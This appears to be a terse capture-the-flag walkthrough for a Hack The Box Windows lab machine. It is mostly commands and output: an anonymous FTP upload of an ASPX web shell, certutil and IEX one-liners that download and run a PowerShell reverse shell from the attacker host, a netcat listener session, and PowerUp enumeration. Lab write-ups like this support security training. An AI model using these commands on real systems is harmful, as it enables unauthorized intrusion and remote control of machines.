@@ -1,0 +1,118 @@
+
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# ftp 10.10.10.5                           
+Connected to 10.10.10.5.
+220 Microsoft FTP Service
+Name (10.10.10.5:kali): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password: 
+230 User logged in.
+Remote system type is Windows_NT.
+
+
+ftp> put cmdasp.aspx 
+local: cmdasp.aspx remote: cmdasp.aspx
+229 Entering Extended Passive Mode (|||49170|)
+125 Data connection already open; Transfer starting.
+100% |************************************************************************|  1442       10.03 MiB/s    --:-- ETA
+226 Transfer complete.
+1442 bytes sent in 00:00 (45.64 KiB/s)
+ftp> 
+
+
+(/usr/share/webshells/aspx/cmdasp.aspx)
+
+
+
+we grab Invoke-PowerShellTcp.ps1 and add
+Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.38 -Port 53
+to the end so that it also runs when the module is loaded.
+
+
+
+
+certutil -urlcache -split -f http://10.10.14.38/Invoke-PowerShellTcp.ps1 C:\Users\Public\Invoke-PowerShellTcp.ps1
+
+powershell -ExecutionPolicy Bypass -File C:\Users\Public\Invoke-PowerShellTcp.ps1
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# rlwrap -cAr nc -lnvp 53
+listening on [any] 53 ...
+connect to [10.10.14.38] from (UNKNOWN) [10.10.10.5] 49175
+Windows PowerShell running as user DEVEL$ on DEVEL
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+PS C:\windows\system32\inetsrv>
+
+
+and easier way would be executing in memory with
+
+powershell iex(new-object net.webclient).downloadstring('http://10.10.14.38/Invoke-PowerShellTcp.ps1')
+
+
+doing the same technique, running PowerUp.ps1 does not return any useful info
+
+powershell -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.38/PowerUp.ps1'); Invoke-AllChecks"
+
+
+
+
+
+
+PS C:\Users\Public> systeminfo
+
+Host Name:                 DEVEL
+OS Name:                   Microsoft Windows 7 Enterprise 
+OS Version:                6.1.7600 N/A Build 7600
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Workstation
+OS Build Type:             Multiprocessor Free
+Registered Owner:          babis
+Registered Organization:   
+Product ID:                55041-051-0948536-86302
+Original Install Date:     17/3/2017, 4:17:31 ??
+System Boot Time:          18/12/2025, 8:02:24 ??
+System Manufacturer:       VMware, Inc.
+System Model:              VMware Virtual Platform
+System Type:               X86-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: x64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2445 Mhz
+BIOS Version:              Phoenix Technologies LTD 6.00, 12/11/2020
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             el;Greek
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
+Total Physical Memory:     3.071 MB
+Available Physical Memory: 2.422 MB
+Virtual Memory: Max Size:  6.141 MB
+Virtual Memory: Available: 5.494 MB
+Virtual Memory: In Use:    647 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    HTB
+Logon Server:              N/A
+Hotfix(s):                 N/A
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: Intel(R) PRO/1000 MT Network Connection
+                                 Connection Name: Local Area Connection 4
+                                 DHCP Enabled:    No
+                                 IP address(es)
+                                 [01]: 10.10.10.5
+                                 [02]: fe80::21fa:a58e:561b:b424
+                                 [03]: dead:beef::54ce:2d0f:a89c:2e7a
+                                 [04]: dead:beef::21fa:a58e:561b:b424
+PS C:\Users\Public> 
+
+
+
+
+
+
+
+
+
